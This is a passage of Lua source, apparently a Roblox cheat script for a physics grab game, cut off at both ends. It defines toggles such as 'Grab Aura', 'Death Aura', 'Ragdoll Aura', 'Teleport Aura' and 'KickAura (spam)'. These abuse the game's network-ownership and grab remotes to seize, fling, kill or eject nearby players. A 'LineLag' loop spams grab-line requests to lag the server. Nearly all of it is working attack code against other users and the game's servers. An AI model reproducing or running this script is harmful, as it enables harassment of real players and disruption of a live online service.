                                if torso and torso.Parent then
                                    Struggle:FireServer()
                                    local stop = false
                                    task.spawn(function()
                                        repeat
                                            task.wait(0.01)
                                            local ownerVal = torso:FindFirstChild("PartOwner")
                                            if ownerVal and ownerVal.Value == localPlayer.Name then
                                                stop = true
                                                break
                                            end
                                        until stop
                                    end)
                                    local initialDist = (hrp.Position - torso.Position).Magnitude
                                    if initialDist <= 24 then
                                        for i = 1, 12 do
                                            if stop then break end
                                            SetNetworkOwner:FireServer(torso, torso.CFrame)
                                            task.wait(0.02)
                                        end
                                        task.spawn(function()
                                            repeat task.wait() until (head and (not head:IsGrounded() and head.AssemblyRootPart.ReceiveAge == 0)) or not playerModel
                                            if hrp and torso then
                                                torso.CFrame = hrp.CFrame * CFrame.new(0, 0, -4)
                                                local targetHRP = playerModel:FindFirstChild("HumanoidRootPart")
                                                if targetHRP then targetHRP.AssemblyLinearVelocity = Vector3.zero end
                                            end
                                        end)
                                    else
                                        local origPos = hrp.CFrame
                                        task.wait(0.03)
                                        for i = 1, 18 do
                                            if stop then break end
                                            local targetPos = torso.Position
                                            local vel = torso.AssemblyLinearVelocity
                                            if vel.Magnitude >= 2 then
                                                local pingMs = service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                                                local predTime = (pingMs / 1000) * 0.8 + 0.05
                                                local gravity = Vector3.new(0, -service.Workspace.Gravity * 0.5, 0)
                                                targetPos = torso.Position + (vel * predTime) + (gravity * predTime * predTime * 0.5)
                                            end
                                            hrp.CFrame = CFrame.new(targetPos) * CFrame.new(0, 10, 0)
                                            task.wait(0.01)
                                            SetNetworkOwner:FireServer(torso, torso.CFrame)
                                        end
                                        task.wait(0.01)
                                        task.spawn(function()
                                            repeat task.wait() until (head and (not head:IsGrounded() and head.AssemblyRootPart.ReceiveAge == 0)) or not playerModel
                                            if hrp and torso then
                                                torso.CFrame = hrp.CFrame * CFrame.new(0, 0, -4)
                                                local targetHRP = playerModel:FindFirstChild("HumanoidRootPart")
                                                if targetHRP then targetHRP.AssemblyLinearVelocity = Vector3.zero end
                                            end
                                        end)
                                        hrp.CFrame = origPos
                                    end
                                    stop = true
                                    DestroyGrabLine:FireServer(torso)
                                end
                            else
                                if targetPart and targetPart.Parent then
                                    local distance = (hrp.Position - targetPart.Position).Magnitude
                                    if distance > 99999 then return end
                                    Struggle:FireServer()
                                    local stop = false
                                    task.spawn(function()
                                        repeat
                                            task.wait(0.01)
                                            local ownerVal = targetPart:FindFirstChild("PartOwner")
                                            if ownerVal and ownerVal.Value == localPlayer.Name then
                                                stop = true
                                                break
                                            end
                                        until stop
                                    end)
                                    local initialDist = (hrp.Position - targetPart.Position).Magnitude
                                    if initialDist <= 29 then
                                        for i = 1, 12 do
                                            if stop then break end
                                            SetNetworkOwner:FireServer(targetPart, targetPart.CFrame)
                                            task.wait(0.02)
                                        end
                                    else
                                        local origPos = hrp.CFrame
                                        task.wait(0.03)
                                        for i = 1, 18 do
                                            if stop then break end
                                            local targetPos = targetPart.Position
                                            local vel = targetPart.AssemblyLinearVelocity
                                            if vel.Magnitude >= 2 then
                                                local pingMs = service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                                                local predTime = (pingMs / 1000) * 0.8 + 0.05
                                                local gravity = Vector3.new(0, -service.Workspace.Gravity * 0.5, 0)
                                                targetPos = targetPart.Position + (vel * predTime) + (gravity * predTime * predTime * 0.5)
                                            end
                                            hrp.CFrame = CFrame.new(targetPos) * CFrame.new(0, 10, 0)
                                            task.wait(0.01)
                                            SetNetworkOwner:FireServer(targetPart, targetPart.CFrame)
                                        end
                                        task.wait(0.01)
                                        hrp.CFrame = origPos
                                    end
                                    stop = true
                                    repeat task.wait() until (function()
                                        local ownerVal = targetPart:FindFirstChild("PartOwner")
                                        return ownerVal and ownerVal.Value == localPlayer.Name
                                    end)()
                                    if hrp and targetPart.AssemblyRootPart then
                                        targetPart.AssemblyRootPart.CFrame = hrp.CFrame + (hrp.CFrame.LookVector * 5)
                                        DestroyGrabLine:FireServer(targetPart.AssemblyRootPart)
                                    end
                                end
                            end
                        end)
                    end
                end)
            end
        else
            bringButton.Visible = false
            bringButton.Active = false
            bringLabel.Visible = false
        end
    end
})


Playa:AddLabel("Bring Key"):AddKeyPicker("BringKeybind", {
    Default = "G",
    Mode = "Press",
    Modes = { "Press" },
    Text = "Bring Key",
    ChangedCallback = function(KeyCode, Modifiers)
        if typeof(KeyCode) == "EnumItem" and KeyCode.EnumType == Enum.KeyCode then
            Config.BringKey = KeyCode
            if Config.BringToggleValue and Playa.Toggles and Playa.Toggles.BringG then
                Playa.Toggles.BringG:SetValue(true)
            end
        end
    end,
})

Playa:AddToggle("Spawn", {
    Text = "Spawn Pallet (Tab)",
    Default = false,
    Callback = function(valuee)
        if Config.palletConn then
            Config.palletConn:Disconnect()
            Config.palletConn = nil
        end
        service.ContextActionService:UnbindAction("Spawn Pallet (TAB)")
        palletGui.Parent = PlayerGui

        if valuee then
            palletButton.Visible = true
            palletButton.Active = true
            palletLabel.Visible = true

            local function spawnPallet()
                local char = localPlayer.Character
                if not char or not char:FindFirstChild("CamPart") then return end
                local toyName = "PalletLightBrown"
                local cf = char.CamPart.CFrame
                local rot = Vector3.new(0, char.CamPart.Orientation.Y, 0)
                return spawntoy(toyName, cf, rot)
            end

            if service.UserInputService.TouchEnabled then
                Config.palletConn = palletButton.InputBegan:Connect(function(an5, an6)
                    if not an6 and an5.UserInputType == Enum.UserInputType.Touch then
                        spawnPallet()
                    end
                end)
            else
                service.ContextActionService:BindAction("Spawn Pallet (TAB)", function(palspawn, palspawn2, _)
                    if palspawn == "Spawn Pallet (TAB)" and palspawn2 == Enum.UserInputState.Begin then
                        spawnPallet()
                    end
                end, false, Enum.KeyCode.Tab)
            end
        else
            palletButton.Visible = false
            palletButton.Active = false
            palletLabel.Visible = false
        end
    end,
})

MainAura:AddToggle("a455", {
    Text = "Whitelist",
    Default = Config.WhitelistFriends,
    Callback = function(state)
        Config.WhitelistFriends = state
    end
})

MainAura:AddToggle("a45", {
    Text = "Grab Aura",
    Default = false,
    Callback = function(enabled)
        if Config.auraThread then
            task.cancel(Config.auraThread)
            Config.auraThread = nil
        end
        if not enabled then return end
        local function getPlayersInRange(center, radius)
            local playersInRange = {}
            for _, player in pairs(service.Players:GetPlayers()) do
                if CanAuraTarget(player) then
                    local char = player.Character
                    if char then
                        local playerTorso = char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart")
                        if playerTorso then
                            local distance = (playerTorso.Position - center.Position).Magnitude
                            if distance <= radius then
                                table.insert(playersInRange, player)
                            end
                        end
                    end
                end
            end
            return playersInRange
        end

        Config.auraThread = task.spawn(function()
            while enabled do
                local character = localPlayer.Character
                if character then
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    if humanoidRootPart then
                        local targets = getPlayersInRange(humanoidRootPart, Config.auraRadius)
                        
                        for _, player in pairs(targets) do
                            task.spawn(function()
                                local playerCharacter = player.Character
                                if playerCharacter then
                                    local playerTorso = playerCharacter:FindFirstChild("Torso") or playerCharacter:FindFirstChild("HumanoidRootPart")
                                    
                                    if playerTorso then
                                        if SetNetworkOwner then
                                            pcall(function() 
                                                SetNetworkOwner:FireServer(playerTorso, playerCharacter.HumanoidRootPart.CFrame) 
                                            end)
                                        end

                                        local velocity = Instance.new("BodyVelocity")
                                        velocity.Parent = playerTorso
                                        velocity.Velocity = Vector3.zero
                                        velocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        service.Debris:AddItem(velocity, 0.1)
                                    end
                                end
                            end)
                        end
                    end
                end
                task.wait(0.01)
            end
        end)
    end
})

MainAura:AddToggle("a77", {
    Text = "Sit Aura",
    Default = false,
    Callback = function(Value)
        Config.SitAuraToggle = Value

        if Config.SitauraConnection then
            Config.SitauraConnection:Disconnect()
            Config.SitauraConnection = nil
        end

        if Value then
            Config.SitauraConnection = service.RunService.Heartbeat:Connect(function()
                if not Config.SitAuraToggle then return end
                
                local rootPart = GetPlayerCharacter() and GetPlayerCharacter().HumanoidRootPart
                if not rootPart then return end

                for _, player in ipairs(service.Players:GetPlayers()) do
                    if CanAuraTarget(player) then
                        local character = player.Character
                        if character then
                            local torso = character:FindFirstChild("Torso")
                            local humanoid = character:FindFirstChildOfClass("Humanoid")

                            if torso and humanoid and (torso.Position - rootPart.Position).Magnitude <= Config.auraRadius then
                                SetNetworkOwner:FireServer(torso, rootPart.CFrame)
                                humanoid.Sit = true
                            end
                        end
                    end
                end
            end)
        end
    end
})

MainAura:AddToggle("a1", {
    Text = "Ragdoll Aura",
    Default = false,
    Callback = function(v)
        Config.RagdollAuraToggle = v
        if Config.RagdollAuraThread then
            task.cancel(Config.RagdollAuraThread)
            Config.RagdollAuraThread = nil
        end
        if v then
            Config.RagdollAuraThread = task.spawn(function()
                while Config.RagdollAuraToggle do
                    local myRoot = GetPlayerCharacter() and GetPlayerCharacter().HumanoidRootPart
                    if myRoot then
                        for _, player in ipairs(service.Players:GetPlayers()) do
                            if CanAuraTarget(player) then
                                local character = player.Character
                                if character then
                                    local targetRoot = character:FindFirstChild("HumanoidRootPart")
                                    if targetRoot and (targetRoot.Position - myRoot.Position).Magnitude <= Config.auraRadius then
                                        SetNetworkOwner:FireServer(targetRoot, targetRoot.CFrame)
                                        targetRoot.AssemblyLinearVelocity = Vector3.new(0, -256, 0)
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.15)
                end
            end)
        end
    end
})

MainAura:AddToggle("a3", {
    Text = "Spin Aura",
    Default = false,
    Callback = function(enabled)
        Config.spinAuraToggle = enabled
        if Config.spinConnection then
            task.cancel(Config.spinConnection)
            Config.spinConnection = nil
        end

        if enabled then
            Config.spinConnection = task.spawn(function()
                while Config.spinAuraToggle do
                    local rootPart = GetPlayerCharacter() and GetPlayerCharacter().HumanoidRootPart
                    if rootPart then
                        for _, player in ipairs(service.Players:GetPlayers()) do
                            if CanAuraTarget(player) ~= false then
                                local character = player.Character
                                if character then
                                    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart")
                                    if torso and (torso.Position - rootPart.Position).Magnitude <= Config.auraRadius then
                                        SetNetworkOwner:FireServer(torso, rootPart.CFrame)
                                        
                                        local spin = torso:FindFirstChild("SpinForce") or Instance.new("BodyAngularVelocity")
                                        spin.Name = "SpinForce"
                                        spin.MaxTorque = Vector3.new(999999, 999999, 999999)
                                        spin.AngularVelocity = Vector3.new(0, Config.spinSpeed, 0)
                                        spin.Parent = torso
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.05)
                end
            end)
        else
            for _, player in ipairs(service.Players:GetPlayers()) do
                local character = player.Character
                if character then
                    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        local spin = torso:FindFirstChild("SpinForce")
                        if spin then
                            spin:Destroy()
                        end
                    end
                end
            end
        end
    end
})

MainAura:AddToggle("a2", {
    Text = "Bring Aura",
    Default = false,
    Callback = function(Val)
        Config.BringAura = Val
        if Val then
            task.spawn(function()
                while Config.BringAura do
                    for _, vas4 in ipairs(service.Players:GetPlayers()) do
                        if CanAuraTarget(vas4) then
                            local CH = vas4.Character
                            if CH then
                                local HumT = CH:FindFirstChild("HumanoidRootPart")
                                local HumD = CH:FindFirstChildOfClass("Humanoid")
                                local GPTWW = GetPlayerCharacter()
                                
                                if HumD and HumT and GPTWW and GPTWW:FindFirstChild("HumanoidRootPart") then
                                    local Vass2 = localPlayer:DistanceFromCharacter(HumT.Position)
                                    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and Vass2 <= 30 then
                                        SetNetworkOwner:FireServer(HumT, lookAt(localPlayer.Character.HumanoidRootPart.Position, HumT.Position))
                                    end
                                    HumD.Sit = false
                                    HumD.WalkSpeed = 25
                                    HumD:MoveTo(GPTWW.HumanoidRootPart.Position)
                                end
                            end
                            
                        end
                    end
                    task.wait()
                end
            end)
        end
    end,
})

MainAura:AddToggle("a4", {
    Text = "Teleport Aura (Spawn)",
	Default = false,
	Callback = function(enabled)
	Config.TeleportAuraT = enabled
		if enabled then
            Config.teleportCoro = coroutine.create(function()
                while task.wait(0.05) do
                    local character = localPlayer.Character
                    local hrp = character and character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        for _, player in pairs(service.Players:GetPlayers()) do
                            if player ~= localPlayer then
                                local root = player.Character:FindFirstChild("HumanoidRootPart")
                                if root and (hrp.Position - root.Position).Magnitude <= 30 then
                                    pcall(function() SetNetworkOwner:FireServer(root, root.CFrame) end)
                                    local targetPos = Vector3.new(0,0,0)
                                    root.CFrame = CFrame.new(targetPos)
                                    if Config.teleportBodie[player] and Config.teleportBodie[player].Parent then Config.teleportBodie[player]:Destroy() end
                                    local bp = Instance.new("BodyPosition")
                                    bp.Name = "TeleportAuraBP"
                                    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    bp.P = 50000
                                    bp.D = 1250
                                    bp.Position = targetPos
                                    bp.Parent = root
                                    Config.teleportBodie[player] = bp
                                    if Config.teleportGyro[player] and Config.teleportGyro[player].Parent then Config.teleportGyro[player]:Destroy() end
                                    local bg = Instance.new("BodyGyro")
                                    bg.Name = "TeleportAuraBG"
                                    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                                    bg.CFrame = root.CFrame
                                    bg.Parent = root
                                    Config.teleportGyro[player] = bg
                                end
                            end
                        end
                    end
                end
            end)
            coroutine.resume(Config.teleportCoro)
        else
            if Config.teleportCoro then coroutine.close(Config.teleportCoro) Config.teleportCoro = nil end
            for _, bp in pairs(Config.teleportBodie) do if bp and bp.Parent then bp:Destroy() end end
            for _, bg in pairs(Config.teleportGyro) do if bg and bg.Parent then bg:Destroy() end end
            Config.teleportBodie, Config.teleportGyro = {}, {}
        end
    end
})

MainAura:AddToggle("a5", {
    Text = "Death Aura",
    Default = false,
    Callback = function(state)
        if Config.deathConnection then Config.deathConnection:Disconnect() end
        Config.deathAuraToggle = state
        if not state then return end

        Config.deathConnection = service.RunService.Heartbeat:Connect(function()
            for _, plr in ipairs(service.Players:GetPlayers()) do
                if CanAuraTarget(plr) then
                    local char = plr.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    local myHRP = GetPlayerCharacter() and GetPlayerCharacter().HumanoidRootPart
                    
                    if hrp and myHRP and (hrp.Position - myHRP.Position).Magnitude <= 25 then
                        pcall(function()
                            SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                            task.wait(0.1)
                            DestroyGrabLine:FireServer(hrp)
                            for _, bp in ipairs(char:GetChildren()) do
                                if bp:IsA("BasePart") then bp.CFrame = CFrame.new(-1e9, 1e9, -1e9) end
                            end
                            local hum = char:FindFirstChildOfClass("Humanoid")
                            if hum then
                                hum:ChangeState(Enum.HumanoidStateType.Dead)
                            end
                        end)
                    end
                end
            end
        end)
    end
})


function Config.Contuuti:cancel(name)
    if Config.Contuuti[name] then
        task.cancel(Config.Contuuti[name])
        Config.Contuuti[name] = nil
    end
end

local function CFP(parent, part)
    return parent:FindFirstChild(part) ~= nil
end
local function Huge()
    return math.huge, math.huge, math.huge
end

local function GetMagnitude(Part1, Part2)
    return (Part1.Position - Part2.Position).Magnitude
end

local function CheckForPartOwner(Head)
    local PartOwner = Head:FindFirstChild("PartOwner")
    return PartOwner and PartOwner.Value == localPlayer.Name
end

local function IsFriend(player)
    if not player or not player.UserId then return false end
    local success, result = pcall(function()
        return localPlayer:IsFriendsWith(player.UserId)
    end)
    return success and result or false
end

local function GetPlayersInRadius()
    local hrp = HRP()
    local targets = {}
    local myPos = hrp.Position
    local radius = 30
    
    for _, player in pairs(service.Players:GetPlayers()) do
        if player == localPlayer then continue end
        if Config.WhitelistFriends and IsFriend(player) then continue end
        
        local char = player.Character
        if not char then continue end
        
        local targetHrp = char:FindFirstChild("HumanoidRootPart")
        if not targetHrp then continue end
        
        local dist = GetMagnitude(hrp, targetHrp)
        if dist <= radius then
            local hum = char:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 then
                table.insert(targets, {
                    Player = player,
                    Character = char,
                    Root = targetHrp,
                    Head = char:FindFirstChild("Head"),
                    Hum = hum,
                    Distance = dist,
                })
            end
        end
    end
    
    return targets
end

local function GetCircularPositions(count, centerX, centerZ, baseRadius, minDistance)
    if count == 0 then return {} end
    if count == 1 then
        return {{X = centerX, Z = centerZ}}
    end
    
    local positions = {}
    local usedPositions = {}
    local baseRadius = baseRadius or 8
    local minDistance = minDistance or 2
    
    local adjustedRadius = math.max(baseRadius, count * 0.8 + 2)
    local maxAttempts = 50
    
    for i = 1, count do
        local angle = (i - 1) * (2 * math.pi / count) + math.random(-0.03, 0.03)
        local radiusOffset = math.random(-0.3, 0.3)
        local actualRadius = adjustedRadius + radiusOffset
        
        local x = centerX + actualRadius * math.cos(angle)
        local z = centerZ + actualRadius * math.sin(angle)
        
        local attempts = 0
        local validPosition = false
        
        while not validPosition and attempts < maxAttempts do
            validPosition = true
            local pos = Vector3.new(x, 0, z)
            
            for _, usedPos in ipairs(usedPositions) do
                local dist = (pos - usedPos).Magnitude
                if dist < minDistance then
                    validPosition = false
                    local pushAngle = math.atan2(z - centerZ, x - centerX)
                    local pushRadius = (actualRadius + minDistance - dist) * 0.3
                    x = x + pushRadius * math.cos(pushAngle + math.random(-0.2, 0.2))
                    z = z + pushRadius * math.sin(pushAngle + math.random(-0.2, 0.2))
                    break
                end
            end
            
            attempts = attempts + 1
            if attempts > maxAttempts then
                x = centerX + (adjustedRadius + count * 0.3) * math.cos(i * 1.3 + 0.5)
                z = centerZ + (adjustedRadius + count * 0.3) * math.sin(i * 1.3 + 0.5)
                break
            end
        end
        
        table.insert(usedPositions, Vector3.new(x, 0, z))
        table.insert(positions, {X = x, Z = z})
    end
    
    return positions
end

local function CheckForHome()
    if etc["LastHouse"] == nil or etc["LastPlotOwner"] == nil or etc["LastPlotOwner"].Parent == nil then
        for i = 1, 5 do
            local Plot = service.Workspace.Plots["Plot"..i]
            for _, v in pairs(Plot.PlotSign["ThisPlotsOwners"]:GetChildren()) do
                if v.Value == localPlayer.Name then
                    etc["LastHouse"] = service.Workspace.PlotItems["Plot"..i]
                    etc["LastPlotOwner"] = v
                    return etc["LastHouse"]
                end
            end
        end
    end
    return etc["LastHouse"]
end

local function SpawnPallete()
	local playerCF = PLCF() or CFrame.new()
	local SpawnCF = playerCF * CFrame.new(0, 14, 20)
    local pallete = spawntoy("PalletLightBrown", SpawnCF, Vector3.zero)
    if not pallete then return nil end
    
    local SoundPart = FWD(pallete, "SoundPart")
    if not SoundPart then return nil end
    
    repeat 
        SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
        task.wait(0.05) 
    until CFP(SoundPart, "PartOwner") or not Config.spamkickaura
    
    for _, v in pairs(pallete:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
            v.Transparency = 0.8
        end
    end
    
    pallete.Name = "RagdollPalete"
    
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(0, math.huge, 0)
    bv.Velocity = Vector3.new(0, 900, 0)
    bv.Parent = pallete.SoundPart
    
    return pallete
end

local function AddBodyPosition(target, height, fixedPos)
    local root = target.Root
    local hrp = HRP()
    if not root then return nil end
    
    for _, v in pairs(root:GetChildren()) do
        if v:IsA("BodyPosition") then
            v:Destroy()
        end
    end
    
    local bodyPos = Instance.new("BodyPosition")
    bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyPos.P = 75000
    bodyPos.D = 12000
    
    if fixedPos then
        bodyPos.Position = fixedPos
    else
        bodyPos.Position = hrp.Position + Vector3.new(0, 15, 0)
    end
    bodyPos.Parent = root
    
    return bodyPos
end

local function KickTarget(target, fixedPosition)
    if not target or not target.Root or not target.Hum then return end
    if target.Hum.Health <= 0 then return end
    
    local root = target.Root
    local hum = target.Hum
    local hrp = HRP()
    root.AssemblyAngularVelocity = Vector3.zero
    root.AssemblyLinearVelocity = Vector3.zero
    
    hum.PlatformStand = true
    
    SetNetworkOwner:FireServer(root, root.CFrame)
    service.RunService.RenderStepped:Wait()
    SetNetworkOwner:FireServer(root, root.CFrame)
    DestroyGrabLine:FireServer(root)
    service.RunService.RenderStepped:Wait()
    SetNetworkOwner:FireServer(root, root.CFrame)
    
    local bodyPos
    if fixedPosition then
        bodyPos = AddBodyPosition(target, nil, fixedPosition)
    else
        bodyPos = AddBodyPosition(target)
    end
    
    if target.Player.IsHeld and target.Player.IsHeld.Value then
        for _, v in pairs(target.Character:GetChildren()) do
            if v:IsA("BasePart") then
                if fixedPosition then
                    v.CFrame = CFrame.new(fixedPosition)
                else
                    v.CFrame = hrp.CFrame * CFrame.new(0, 15, 0)
                end
            end
        end
    end
    
    if Config.DoRagdoll and CFP(hum, "Ragdolled") and not hum.Ragdolled.Value then
        if Config.UsePallete then
            local pallete = inv:FindFirstChild("RagdollPalete")
            if not pallete then
                pallete = SpawnPallete()
            end
            if pallete and pallete.SoundPart then
                if fixedPosition then
                    pallete.SoundPart.Position = fixedPosition
                else
                    pallete.SoundPart.Position = root.Position
                end
            end
        end
        RagdollRemote:FireServer(root, 1)
    end
    
    service.RunService.RenderStepped:Wait()
    DestroyGrabLine:FireServer(root)
end

kickaura:AddToggle("KickAuraT", {
    Text = "KickAura (spam)",
    Default = false,
    Callback = function(value)
        local hrp = HRP()
        if value then
            if Config.spamkickaura then
                return
            end
            Config.spamkickaura = true
            if Config.LineLagEnabled then
                if Config.spamkickauralag then
                    Config.spamkickauralag = false
                    Config.Contuuti:cancel("LineLagThread")
                end
                Config.spamkickauralag = true
                Config.Contuuti:cancel("LineLagThread")
                Config.Contuuti["LineLagThread"] = task.spawn(function()
                    while Config.spamkickauralag do
                        local spawnLocation = service.Workspace:FindFirstChild("SpawnLocation") or service.Workspace:FindFirstChild("Spawn") or hrp
                        if spawnLocation then
                            local randomX = math.random(-1e9, 1e9)
                            local randomZ = math.random(-1e9, 1e9)
                            local directions = {
                                CFrame.new(randomX, 0, randomZ),
                                CFrame.new(-randomX, 0, -randomZ),
                                CFrame.new(randomX, 0, -randomZ),
                                CFrame.new(-randomX, 0, randomZ),
                                CFrame.new(randomX * 0.5, 0, randomZ * 0.5),
                                CFrame.new(-randomX * 0.5, 0, -randomZ * 0.5),
                            }
                            for _, pos in pairs(directions) do
                                pcall(function()
                                    CreateGrabLine:FireServer(spawnLocation, pos)
                                end)
                            end
                        end
                        task.wait()
                    end
                end)
            end
            if Config.DoRagdoll and Config.UsePallete then
                local pallete = inv:FindFirstChild("RagdollPalete")
                if not pallete then
                    SpawnPallete()
                end
            end
            Config.Contuuti:cancel("LoopGrabKickThread")
            Config.Contuuti["LoopGrabKickThread"] = task.spawn(function()
                local targetData = {}
                local circularPositions = {}
                local lastUpdateTime = 0
                local positionUpdateInterval = 0.5
                while Config.spamkickaura do
                    service.RunService.RenderStepped:Wait()
                    local targets = GetPlayersInRadius()
                    local currentTargetNames = {}
                    for _, t in pairs(targets) do
                        currentTargetNames[t.Player.Name] = true
                    end
                    for name, data in pairs(targetData) do
                        if not currentTargetNames[name] then
                            if data.BodyPos then
                                data.BodyPos:Destroy()
                            end
                            targetData[name] = nil
                        end
                    end
                    local currentTime = tick()
                    if currentTime - lastUpdateTime > positionUpdateInterval or #targets ~= #targetData then
                        local myPos = hrp.Position
                        local centerX = myPos.X
                        local centerZ = myPos.Z
                        local count = #targets
                        if count > 0 then
							Radius = 30
							MinDistance = 2
                            circularPositions = GetCircularPositions(
                                count, 
                                centerX, 
                                centerZ, 
                                Radius * 0.25,
                                MinDistance
                            )
                            lastUpdateTime = currentTime
                        end
                    end
                    local targetIndex = 0
                    for _, target in pairs(targets) do
                        targetIndex = targetIndex + 1
                        local name = target.Player.Name
                        if not targetData[name] then
                            targetData[name] = {
                                Player = target.Player,
                                Root = target.Root,
                                Head = target.Head,
                                Hum = target.Hum,
                                Character = target.Character,
                                BodyPos = nil,
                            }
                        end
                        local data = targetData[name]
                        data.Root = target.Root
                        data.Head = target.Head
                        data.Hum = target.Hum
                        data.Character = target.Character
                        local pos = circularPositions[targetIndex]
                        local fixedPos = nil
                        if pos then
                            fixedPos = Vector3.new(pos.X, hrp.Position.Y + 15, pos.Z)
                        end
                        KickTarget(target, fixedPos)
                    end
                    task.wait(0.05)
                end
                for name, data in pairs(targetData) do
                    if data.BodyPos then
                        data.BodyPos:Destroy()
                    end
                    targetData[name] = nil
                end
                targetData = {}
                circularPositions = {}
                if Config.LineLagEnabled then
                    Config.spamkickauralag = false
                    Config.Contuuti:cancel("LineLagThread")
                end
            end)
        else
            if not Config.spamkickaura then
                return
            end
            Config.spamkickaura = false
            Config.Contuuti:cancel("LoopGrabKickThread")
            if Config.LineLagEnabled then
                Config.spamkickauralag = false
                Config.Contuuti:cancel("LineLagThread")
            end
            for _, player in pairs(service.Players:GetPlayers()) do
                if player ~= localPlayer then
                    local char = player.Character
                    if char then
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if root then
                            for _, v in pairs(root:GetChildren()) do
                                if v:IsA("BodyPosition") then
                                    v:Destroy()
                                end
                            end
                        end
                        local hum = char:FindFirstChild("Humanoid")
                        if hum then
                            hum.PlatformStand = false
                        end
                    end
                end
            end
        end
    end
})

kickaura:AddButton({
    Text = "SpawnPallet",
    Callback = function()
        for _, v in pairs(inv:GetChildren()) do
            if v.Name == "RagdollPalete" then
                DestroyToy:FireServer(v)
            end
        end
        SpawnPallete()
    end
})

kickaura:AddToggle("WhiteList", {
    Text = "WhiteList",
    Default = Config.WhitelistFriends,
    Callback = function(value)
        Config.WhitelistFriends = value
    end
})

Stiyyyyyyyyyyyyyyyyy:AddToggle("Plaetst", {
    Text = "Pallet Sticky",
    Default = false,
    Callback = function(Value)
        Config.PStickyToggle = Value
        if Value then
            if not Config.Contuuti["PalletSticker"] then
                Config.Contuuti["PalletSticker"] = workspace.ChildAdded:Connect(function(c)
                    if c.Name == "GrabParts" and Config.PStickyToggle then
                        local part = c:FindFirstChild("GrabPart") or c:WaitForChild("GrabPart", 2)
                        if not part then return end
                        local weld = part:FindFirstChildOfClass("WeldConstraint") or part:FindFirstChildOfClass("Weld")
                        if not weld or not weld.Part1 then return end
                        local grabbedObj = weld.Part1
                        local Model = grabbedObj:FindFirstAncestor("PalletLightBrown") or (grabbedObj.Name == "PalletLightBrown" and grabbedObj)
                        if Model and grabbedObj:IsA("BasePart") then
                            local character = GetCharacter()
                            local hrp = character:FindFirstChild("HumanoidRootPart")
                            if not hrp then return end
                            local originalMassless = grabbedObj.Massless
                            grabbedObj.Massless = true
                            local att0 = Instance.new("Attachment")
                            att0.Parent = hrp
                            local att1 = Instance.new("Attachment")
                            att1.Parent = grabbedObj
                            local alignPos = Instance.new("AlignPosition")
                            alignPos.Mode = Enum.PositionAlignmentMode.TwoAttachment
                            alignPos.Attachment0 = att0
                            alignPos.Attachment1 = att1
                            alignPos.MaxForce = 999999
                            alignPos.Responsiveness = 200
                            alignPos.Enabled = false
                            alignPos.Parent = grabbedObj
                            local alignRot = Instance.new("AlignOrientation")
                            alignRot.Mode = Enum.OrientationAlignmentMode.TwoAttachment
                            alignRot.Attachment0 = att0
                            alignRot.Attachment1 = att1
                            alignRot.MaxTorque = 999999
                            alignRot.Responsiveness = 200
                            alignRot.Enabled = false
                            alignRot.Parent = grabbedObj
                            local Attachi = false
                            local heartbeatConnection
                            heartbeatConnection = service.RunService.Heartbeat:Connect(function()
                                if not character or not hrp:IsDescendantOf(workspace) then return end
                                local standingOnPallet = false
                                local humanoid = character:FindFirstChildOfClass("Humanoid")
                                if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
                                    local rayOrigin = hrp.Position
                                    local rayDirection = Vector3.new(0, -4, 0)
                                    local raycastParams = RaycastParams.new()
                                    raycastParams.FilterDescendantsInstances = {character}
                                    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                                    local result = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                                    if result and result.Instance then
                                        local detectedModel = result.Instance:FindFirstAncestor("PalletLightBrown") or (result.Instance.Name == "PalletLightBrown" and result.Instance)
                                        standingOnPallet = (detectedModel == Model)
                                    end
                                end
                                if standingOnPallet and Config.PStickyToggle then
                                    if not Attachi then
                                        att0.CFrame = hrp.CFrame:ToObjectSpace(grabbedObj.CFrame)
                                        alignPos.Enabled = true
                                        alignRot.Enabled = true
                                        Attachi = true
                                    end
                                else
                                    if Attachi then
                                        alignPos.Enabled = false
                                        alignRot.Enabled = false
                                        Attachi = false
                                    end
                                end
                            end)
                            local cleanup
                            cleanup = c.AncestryChanged:Connect(function(_, parent)
                                if not parent then
                                    if heartbeatConnection then heartbeatConnection:Disconnect() end
                                    alignPos:Destroy()
                                    alignRot:Destroy()
                                    att0:Destroy()
                                    att1:Destroy()
                                    grabbedObj.Massless = originalMassless
                                    cleanup:Disconnect()
                                end
                            end)
                        end
                    end
                end)
            end
        else
            if Config.Contuuti["PalletSticker"] then
                Config.Contuuti["PalletSticker"]:Disconnect()
                Config.Contuuti["PalletSticker"] = nil
            end
        end
    end
})

miscOtherSec:AddToggle("SpeedT", {
    Text = "Speed Tractor",
    Default = false,
    Callback = function(v)
        Config.speedTractor = v
        if v then
            Config.tractorGyro = nil
            Config.tractorSpeed = 0
            Config.speedTractorConn = service.RunService.Heartbeat:Connect(function(dt)
                if not Config.speedTractor then
                    if Config.tractorGyro then Config.tractorGyro:Destroy() Config.tractorGyro = nil end
                    Config.tractorSpeed = 0
                    return
                end
                local char = GetCharacter()
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if not hum then return end
                local seatPart = hum.SeatPart
                if not seatPart or not seatPart:IsA("VehicleSeat") then
